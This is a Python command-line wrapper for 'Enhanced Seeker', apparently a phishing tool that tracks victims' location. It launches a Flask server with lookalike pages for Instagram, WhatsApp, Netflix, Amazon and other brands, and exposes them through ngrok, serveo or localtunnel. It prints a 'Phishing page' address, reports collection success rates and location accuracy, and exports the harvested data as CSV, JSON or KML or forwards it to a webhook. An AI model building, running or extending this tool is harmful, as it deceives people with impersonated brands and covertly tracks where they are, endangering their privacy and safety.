#!/usr/bin/env python3
"""
Enhanced Seeker - Command Line Interface
Backwards compatibility with original seeker functionality
"""

import argparse
import os
import sys
import subprocess
import json
import requests
import time
from datetime import datetime
from config import Config

class SeekerCLI:
    def __init__(self):
        self.config = Config()
        self.base_url = f"http://localhost:{self.config.PORT}"
        
    def start_server(self, template='instagram', port=5000, tunnel=None):
        """Start the Enhanced Seeker server"""
        env = os.environ.copy()
        env['TEMPLATE'] = template
        env['PORT'] = str(port)
        
        if tunnel:
            env['TUNNEL_SERVICE'] = tunnel
            
        # Start the Flask app
        cmd = [sys.executable, 'app.py']
        subprocess.Popen(cmd, env=env)
        
        print(f"Enhanced Seeker starting on port {port}")
        print(f"Template: {template}")
        
        if tunnel:
            print(f"Setting up {tunnel} tunnel...")
            time.sleep(3)  # Wait for server to start
            try:
                response = requests.get(f"{self.base_url}/api/tunnel/start/{tunnel}")
                if response.status_code == 200:
                    data = response.json()
                    print(f"Tunnel URL: {data.get('url', 'Error getting URL')}")
                else:
                    print("Failed to start tunnel")
            except:
                print("Could not connect to server for tunnel setup")
        
        print(f"Dashboard: http://localhost:{port}")
        print(f"Phishing page: http://localhost:{port}/phish")
        
    def list_templates(self):
        """List available templates"""
        templates = [
            'instagram', 'whatsapp', 'snapchat', 'tiktok',
            'uber', 'netflix', 'spotify', 'amazon'
        ]
        
        print("Available templates:")
        for i, template in enumerate(templates, 1):
            print(f"{i:2d}. {template.capitalize()}")
            
    def export_data(self, format='csv', output=None):
        """Export collected data"""
        try:
            response = requests.get(f"{self.base_url}/api/export/{format}")
            if response.status_code == 200:
                if output:
                    with open(output, 'w') as f:
                        f.write(response.text)
                    print(f"Data exported to {output}")
                else:
                    print(response.text)
            else:
                print("Failed to export data")
        except:
            print("Could not connect to server")
            
    def show_stats(self):
        """Show current statistics"""
        try:
            response = requests.get(f"{self.base_url}/api/statistics")
            if response.status_code == 200:
                stats = response.json()
                print(f"Total Sessions: {stats.get('total_sessions', 0)}")
                print(f"Successful Collections: {stats.get('successful_collections', 0)}")
                print(f"Success Rate: {stats.get('success_rate', 0):.1f}%")
                print(f"Average Accuracy: {stats.get('avg_accuracy', 0):.1f}m")
            else:
                print("Failed to get statistics")
        except:
            print("Could not connect to server")

def main():
    parser = argparse.ArgumentParser(
        description='Enhanced Seeker - Advanced Geolocation Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python seeker.py -t instagram -p 8080
  python seeker.py --tunnel ngrok -t whatsapp
  python seeker.py --export csv --output results.csv
  python seeker.py --stats
        """
    )
    
    parser.add_argument('-t', '--template', 
                       choices=['instagram', 'whatsapp', 'snapchat', 'tiktok', 
                               'uber', 'netflix', 'spotify', 'amazon'],
                       default='instagram',
                       help='Template to use (default: instagram)')
    
    parser.add_argument('-p', '--port', type=int, default=5000,
                       help='Port for web server (default: 5000)')
    
    parser.add_argument('--tunnel', 
                       choices=['ngrok', 'serveo', 'localtunnel'],
                       help='Tunnel service to use')
    
    parser.add_argument('--list-templates', action='store_true',
                       help='List available templates')
    
    parser.add_argument('--export', 
                       choices=['csv', 'json', 'kml'],
                       help='Export data format')
    
    parser.add_argument('--output', 
                       help='Output file for export')
    
    parser.add_argument('--stats', action='store_true',
                       help='Show current statistics')
    
    parser.add_argument('--webhook',
                       help='Webhook URL for data forwarding')
    
    args = parser.parse_args()
    
    cli = SeekerCLI()
    
    if args.list_templates:
        cli.list_templates()
    elif args.export:
        cli.export_data(args.export, args.output)
    elif args.stats:
        cli.show_stats()
    else:
        # Set webhook if provided
        if args.webhook:
            os.environ['WEBHOOK_URL'] = args.webhook
            
        cli.start_server(args.template, args.port, args.tunnel)

if __name__ == '__main__':
    main()
